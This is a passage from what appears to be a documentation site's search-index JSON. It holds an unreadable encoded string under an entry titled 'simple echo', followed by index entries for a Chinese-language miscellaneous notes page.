sY6BXw2iPGNsA41MNauUVZYbB4UKOlLxIthJNOa4/TiY4BpNANOX5SOY+3t7w4bn3L4y86gK8VLBt14P2CjQ6Zn0iHKzqXdXWZn1wUAOnvPoT2i6H/+yXMOc1c0CgnkoBgKNVbIlr9Wt/IpdEokEfyaBbrjdTYhOrHnujMSNgI/S56cqYDZEvktf0FR48ET0N4ZGV4AGXrT3/P8RtdKh4Aq4dMCLZ+lCwemz7R30uUqOBgWjF1s6RA=;^","title":"simple echo"},{"location":"others/","text":"\u6742\u9879 \u00b6 Abstract \u8fd9\u91cc\u662f\u4e00\u4e9b\u4e34\u65f6\u7684\u4e1c\u897f Table of Contents \u00b6 note\u8ba1\u5212","title":"\u6742\u9879"},{"location":"others/#_1","text":"Abstract \u8fd9\u91cc\u662f\u4e00\u4e9b\u4e34\u65f6\u7684\u4e1c\u897f","title":"\u6742\u9879"},{"location":"others/#table-of-contents","text":"note\u8ba1\u5212","title":"Table of Contents"}]}